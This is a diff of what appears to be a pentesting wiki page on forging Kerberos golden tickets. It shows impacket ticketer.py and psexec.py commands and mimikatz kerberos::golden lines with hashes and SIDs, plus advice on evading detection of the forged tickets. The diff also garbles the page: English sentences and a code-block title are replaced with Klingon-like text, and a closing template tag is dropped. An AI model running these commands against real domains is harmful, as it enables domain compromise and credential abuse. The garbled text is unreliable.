@@ -29,9 +29,7 @@ python ticketer.py -nthash 25b2076cda3bfd6209161a6c78a69c1c -domain-sid S-1-5-21
 export KRB5CCNAME=/root/impacket-examples/stegosaurus.ccache
 python psexec.py jurassic.park/stegosaurus@lab-wdc02.jurassic.park -k -no-pass
 ```
-{% endcode %}
-
-{% code title="From Windows" %}
+{% code title="Qa' Windows" %}
 ```bash
 #mimikatz
 kerberos::golden /User:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1-5-21-1874506631-3219952063-538504511 /krbtgt:ff46a9d8bd66c6efd77603da26796f35 /id:500 /groups:512 /startoffset:0 /endin:600 /renewmax:10080 /ptt
@@ -43,7 +41,7 @@ kerberos::golden /user:Administrator /domain:dollarcorp.moneycorp.local /sid:S-1
 ```
 {% endcode %}
 
-**Once** you have the **golden Ticket injected**, you can access the shared files **(C$)**, and execute services and WMI, so you could use **psexec** or **wmiexec** to obtain a shell (looks like yo can not get a shell via winrm).
+**Qatlh** vItlhutlh **golden Ticket injected**, vaj **shared files (C$)**, 'ej execute services 'ej WMI, vaj **psexec** 'ej **wmiexec** vItlhutlh shell (yo can not get a shell via winrm).
 
 ### Bypassing common detections
 
@@ -52,12 +50,10 @@ The most frequent ways to detect a golden ticket are by **inspecting Kerberos tr
 `Lifetime : 3/11/2021 12:39:57 PM ; 3/9/2031 12:39:57 PM ; 3/9/2031 12:39:57 PM`
 
 Use the `/startoffset`, `/endin` and `/renewmax` parameters to control the start offset, duration and the maximum renewals (all in minutes).
-
 ```
 Get-DomainPolicy | select -expand KerberosPolicy
 ```
-
-Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs.  However, what you can correlate is **seeing 4769's without a prior 4768**.  It's **not possible to request a TGS without a TGT**, and if there is no record of a TGT being issued, we can infer that it was forged offline.
+Unfortunately, the TGT's lifetime is not logged in 4769's, so you won't find this information in the Windows event logs. However, what you can correlate is **seeing 4769's without a prior 4768**. It's **not possible to request a TGS without a TGT**, and if there is no record of a TGT being issued, we can infer that it was forged offline.
 
 In order to **bypass this detection** check the diamond tickets:
 
